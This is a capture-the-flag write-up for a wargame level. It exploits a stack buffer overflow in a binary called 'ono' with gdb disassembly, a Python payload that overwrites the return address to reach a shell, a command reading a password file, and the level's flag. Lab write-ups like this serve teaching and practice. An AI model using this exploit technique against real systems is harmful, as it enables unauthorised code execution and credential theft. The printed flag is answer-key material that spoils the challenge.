## Level 01

level01 hands us the [ono.c](./source.c) and `ono` executable.
After a quick overview of the source code we can see that there is a `read` call with a size that is bigger than its buffer.
We can also see a function `maintenance_exec` that gives us a nice `geteuid` + `execl` to execute a shell.

Lets start by looking at the way the stack is created within the `run_diagnostic` function that contains the `read` call:

```asm
(gdb) disas run_diagnostic
Dump of assembler code for function run_diagnostic:
   0x0000000000401396 <+0>:	endbr64
   0x000000000040139a <+4>:	push   %rbp
   0x000000000040139b <+5>:	mov    %rsp,%rbp
   0x000000000040139e <+8>:	sub    $0x40,%rsp
   0x00000000004013a2 <+12>:	call   0x401327 <print_header>
   0x00000000004013a7 <+17>:	lea    -0x40(%rbp),%rax
   0x00000000004013ab <+21>:	mov    $0x100,%edx
   0x00000000004013b0 <+26>:	mov    %rax,%rsi
   0x00000000004013b3 <+29>:	mov    $0x0,%edi
   0x00000000004013b8 <+34>:	call   0x401140 <read@plt>

   ...
```

We can determine the offset of the `return address` to be:

```
Higher Memory Addresses
+-----------------------+  <--- Offset = 80
|  Saved RIP            |  <--- The value we need to change
|  (Return Address)     |
+-----------------------+  <--- Offset = 72
|  Saved RBP            |
|  (Old Frame Pointer)  |
+-----------------------+  <--- Offset = 64
|                       |
|   64 bytes buffer     |
|                       |
+-----------------------+  <--- Offset 0 (%rbp - 0x40) == %rsp
Lower Memory Addresses
```

Now all there is left to do is set the return address to the location of the `geteuid` + `execl`.
Lets figure out the location with the use of `gdb`:

```asm
(gdb) disas maintenance_exec
Dump of assembler code for function maintenance_exec:
   0x0000000000401276 <+0>:	endbr64
   0x000000000040127a <+4>:	push   %rbp
   0x000000000040127b <+5>:	mov    %rsp,%rbp
   0x000000000040127e <+8>:	push   %rbx
   0x000000000040127f <+9>:	sub    $0x18,%rsp
   0x0000000000401283 <+13>:	mov    %rdi,-0x18(%rbp)
   0x0000000000401287 <+17>:	mov    $0xdeadbeef,%eax
   0x000000000040128c <+22>:	cmp    %rax,-0x18(%rbp)
   0x0000000000401290 <+26>:	jne    0x4012ca <maintenance_exec+84>
   0x0000000000401292 <+28>:	call   0x401130 <geteuid@plt>
   0x0000000000401297 <+33>:	mov    %eax,%ebx
   0x0000000000401299 <+35>:	call   0x401130 <geteuid@plt>

   ...
```

The address we need to jump to is `0x0000000000401292`!

## The exploit

We can now create our payload and hand it to the executable through `cat payload -`:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'\x00' * 72 + b'\x92\x12\x40\x00\x00\x00\x00\x00')" > payload
```

```bash
level01@rainfall:~$ cat payload - | ./ono
  [ONO-SENDAI VII] Cyberspace deck online.
  [ONO-SENDAI VII] Diagnostic subsystem v2.1.4
  [ONO-SENDAI VII] Waiting for operator ID: [ONO-SENDAI VII] Unknown operator. Logging attempt.
cat /home/flag01/.pass
3309s5bx9kagi0z0qt0erxvivievlh86
```

Ending with the flag: `3309s5bx9kagi0z0qt0erxvivievlh86`
